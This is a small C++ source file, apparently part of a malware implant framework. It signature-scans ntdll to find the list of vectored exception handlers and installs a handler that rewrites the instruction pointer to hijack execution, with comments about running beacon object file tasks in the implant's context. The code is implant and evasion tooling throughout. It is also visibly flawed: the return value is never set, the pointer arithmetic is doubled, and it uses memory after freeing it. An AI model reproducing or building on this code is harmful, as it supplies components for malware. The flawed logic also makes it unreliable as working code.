#include <core/corelib.hpp>
namespace Veh {

	PVOID FunctionReturn = nullptr;

	UINT_PTR VehGetFirstHandler(const wchar_t *const mod_name, const char *signature, const char *mask) {
		HEXANE

		volatile uintptr_t handler = { };
		const LdrpVectorHandlerList *handlers = { };
		uint32_t match = 0;

		const auto ntdll = Memory::Modules::GetModuleEntry(Utils::GetHashFromStringW(mod_name, x_wcslen(mod_name)));

		if (!(match = Memory::Scanners::SignatureScan(R_CAST(uintptr_t, ntdll->DllBase), ntdll->SizeOfImage, signature, mask))) {
			return_defer(ntstatus);
		}

		match += 0xD;
		if (!(handlers = R_CAST(LdrpVectorHandlerList*, *R_CAST(int32_t*, match + (match + 0x3) + 0x7)))) {
			return_defer(ntstatus);
		}

		Ctx->Nt.RtlFreeHeap(GetProcessHeap(), 0, ntdll);
		ntstatus = Ctx->Nt.NtReadVirtualMemory(NtCurrentProcess(), S_CAST(void**, &ntdll->DllBase), C_PTR(handlers->First), sizeof(void*), nullptr);

		defer:
		return handler;
	}

	LONG WINAPI Debugger(EXCEPTION_POINTERS *exception) {
		HEXANE

		exception->ContextRecord->IP_REG = R_CAST(DWORD64, U_PTR(FunctionReturn));

		// request_id
		// CreateStream()

		// spider makes a good point explaining that the VEH will run under the implant's context, not from the BOF
		// information for the BOF task should come from the implant context

		return EXCEPTION_CONTINUE_EXECUTION;
	}
}
